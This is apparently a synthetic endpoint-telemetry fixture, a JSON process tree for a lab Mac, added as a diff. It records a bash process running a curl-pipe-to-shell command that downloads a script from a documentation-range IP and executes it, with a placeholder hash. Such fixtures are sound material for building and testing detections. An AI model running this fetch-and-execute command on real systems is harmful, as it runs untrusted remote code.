@@ -1,0 +1,42 @@
+{
+ "hostname": "LAB-MAC-03",
+ "process_tree": [
+  {
+   "timestamp": "2026-10-07T09:00:00Z",
+   "process": {
+    "pid": 801,
+    "name": "Terminal",
+    "executable": "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal",
+    "command_line": "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal",
+    "user": "sam",
+    "children": [
+     {
+      "timestamp": "2026-10-07T09:00:05Z",
+      "process": {
+       "pid": 912,
+       "name": "bash",
+       "executable": "/bin/bash",
+       "command_line": "bash -c 'curl -s http://198.51.100.77/i.sh | sh'",
+       "user": "sam",
+       "hash": {
+        "sha256": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
+       },
+       "children": [
+        {
+         "timestamp": "2026-10-07T09:00:06Z",
+         "process": {
+          "pid": 913,
+          "name": "curl",
+          "executable": "/usr/bin/curl",
+          "command_line": "curl -s http://198.51.100.77/i.sh",
+          "user": "sam"
+         }
+        }
+       ]
+      }
+     }
+    ]
+   }
+  }
+ ]
+}
